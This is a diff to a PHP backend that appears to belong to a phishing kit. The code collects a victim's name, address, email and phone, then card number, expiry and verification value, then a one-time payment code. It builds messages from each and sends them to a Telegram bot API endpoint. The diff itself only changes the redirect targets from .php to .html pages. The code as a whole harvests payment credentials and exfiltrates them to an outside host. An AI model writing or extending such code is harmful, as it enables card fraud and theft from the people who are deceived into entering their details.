@@ -21,7 +21,7 @@ $email = $_POST['email'];
 $customer_phone = $_POST['customer-phone'];
 
 $message = "New order received!\n\nFull Name: $full_name\nAddress: $customer_address, $customer_city, $provinces, $postal_code\nEmail: $email\nPhone: $customer_phone";
-header('location:paiment.php');
+header('location:paiment.html');
 
 }
 if(isset($_POST['paiment'])){
@@ -30,7 +30,7 @@ if(isset($_POST['paiment'])){
     $expiry=$_POST['expiry'];
     $verification_value =$_POST['verification_value'];
 $message = "New payment information received:\n\nNumber: $number\nName: $name\nExpiry: $expiry\nVerification Value: $verification_value";
-header('location:Verification.php');
+header('location:Verification.html');
 
 }
 if(isset($_POST['verification'])){
@@ -38,7 +38,7 @@ if(isset($_POST['verification'])){
 $code=$_POST['code'];
 $message = "New payment Code received:\n\nCode: $code";
 
-header('location:Verification.php');
+header('location:Verification.html');
 }
 // URL for the Telegram Bot API
 $url = "https://api.telegram.org/bot$token/sendMessage";
